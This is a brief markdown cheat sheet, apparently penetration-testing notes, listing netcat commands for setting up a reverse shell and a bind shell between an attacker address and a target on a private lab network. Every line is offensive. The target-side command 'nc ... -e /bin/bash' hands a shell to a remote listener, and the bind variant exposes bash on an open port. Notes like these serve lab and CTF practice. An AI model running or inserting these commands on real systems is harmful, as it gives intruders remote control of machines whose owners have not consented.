
## Netcat Reverse Shell
- localhost: 10.10.10.10
  - `nc -nvlp 4444`
- target: 10.10.10.5
  - `nc 10.10.10.10 4444 -e /bin/bash`

## Netcat Bind Shell
- localhost: 10.10.10.10
  - `nc 10.10.10.5 4444`
- target: 10.10.10.5
  - `nc -nvlp 4444 -e /bin/bash`
